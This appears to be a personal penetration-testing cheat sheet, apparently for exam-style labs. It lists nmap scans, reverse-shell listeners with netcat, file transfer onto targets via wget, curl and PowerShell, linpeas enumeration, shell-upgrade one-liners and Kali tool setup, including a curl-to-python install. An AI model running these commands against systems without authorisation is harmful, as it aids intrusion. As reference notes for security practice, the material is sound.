# PT𓀮EH

# toc


## enumeration

<details><summary><input type=checkbox> port scanning</summary>

```sh
nmap -v $host | tee 00.nmap # fast initial scan.

```

</details>

## foothold and pivot

### kali

<details> <summary><input type=checkbox> serving files</summary>

```sh
# via webserver:
python3 -m http.server 80

# via samba:
impacket-smbserver -smb2server share .
```
---

</details>

<details><summary><input type=checkbox> reverse shells and port bindings</summary>

```sh
# netcat
rlwrap nc -lnvp 42424

# chisel

# plink
```

</details>


### linux

<details><summary><input type=checkbox> information gathering</summary>


```sh
id # user and groups.
ps -p $$
ip a # or ifconfig.
netstat -tulpen # connections.
lsblk # devices.
locate / # list of probably every file on the system.
# depending on under which user updatedb ran.
```

</details>

<details><summary><input type=checkbox> downloading files</summary>


```sh
# linux download:
wget $h/file
curl $h/file -so file
```

</details>

<details><summary><input type=checkbox> info gathering with external tools</summary>


```sh
./linpeas.sh -a
```

</details>

### windows

<details><summary><input type=checkbox> downloading files</summary>


```sh
# powershell:
Invoke-WebRequest hostname/file.exe -OutFile file.exe
# powershell shorthand:
iwr hostname/file.exe -outf file.exe

```

</details>

<details><summary><input type=checkbox> info gathering with external tools</summary>


```sh
linpeas.exe
linpeas.bat # if exe fails.
```

</details>

## priviledge escalation

### linux

### windows

## oneliners

<details><summary></summary>

```sh
# upgrade shell:
python -c 'import pyt;pty.spawn("bash")'

# fix environment:
export TERM=linux

# listen for incoming connection:
nc -nvlp 1234

# logging a reverse shell locally:
script # stop with ^D. breaks in vi. finicky.

# get a temp dir:
cd $(mktemp -d)

# get local connections:
netstat -tulpen
```

</details>

# kali config

<details><summary></summary>

```sh
# pip2 for new Kalis:
curl -s https://bootstrap.pypa.io/get-pip.py | python2
pip2 install requests colorama # for the exploit above.
pip2 install xlrd # for windows exploit suggester.
apt install ncdu

pip3 install cve_searchsploit # https://github.com/andreafioraldi/cve_searchsploit
# update it:
cve_searchsploit -u

cd /opt
git clone 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git'
cd Windows-Exploit-Suggester
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --help

# chisel
cd /opt
wget 'https://github.com/jpillora/chisel/releases/download/v1.7.1/chisel_1.7.1_windows_386.gz'
wget 'https://github.com/jpillora/chisel/releases/download/v1.7.1/chisel_1.7.1_linux_386.gz'
gunzip chisel*
mv chisel*windows* chisel.exe
```

</details>

# kali tips

<details><summary></summary>

* ranger disables previews for root (enable them on a by case basis with `zp`)

</details>

